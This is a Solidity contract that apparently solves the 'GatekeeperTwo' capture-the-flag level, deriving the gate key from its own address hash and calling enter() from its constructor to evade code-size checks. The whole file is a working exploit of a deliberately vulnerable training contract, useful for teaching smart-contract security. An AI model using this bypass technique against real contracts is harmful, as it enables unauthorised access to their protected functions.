// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

contract GatekeeperTwo {
    constructor(address target) {
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        (bool success, ) = target.call(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        if (!success) revert CallNotSuccess();
    }
}
